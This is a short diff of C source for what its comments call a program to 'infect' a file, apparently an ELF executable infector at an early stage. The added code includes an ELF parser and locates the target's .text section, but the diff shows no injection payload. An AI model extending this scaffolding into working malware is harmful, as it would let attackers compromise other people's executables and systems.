@@ -7,15 +7,18 @@
 #include <sys/types.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <elf.h>
 
 #include "config.h"
+#include "elf-parser.h"
 
 int main(int argc, char **argv)
 {
     int fd;					// File descriptor the file to infect
     struct stat *to_infect_stat = NULL;		// Structure to save the stat of the file to infect
     byte *to_infect_content = NULL;		// Buffer that contents the 
-    
+    Elf64_Shdr *text_section;			// ELF Section header for the .text section
+
     // We check if the usage is correct
     if (argc != EXPECTED_ARGC) {
 	fprintf(stderr, "Usage: %s <file-to-infect>", argv[0]);
@@ -52,5 +55,13 @@ int main(int argc, char **argv)
     }
 
     close(fd);
+
+    setup_elf(to_infect_content);
+    text_section = get_section_by_name(".text");
+    if (text_section == NULL) {
+	fprintf(stderr, "Get section failed");
+	exit(1);
+    }
+
     return EXIT_SUCCESS;
 }
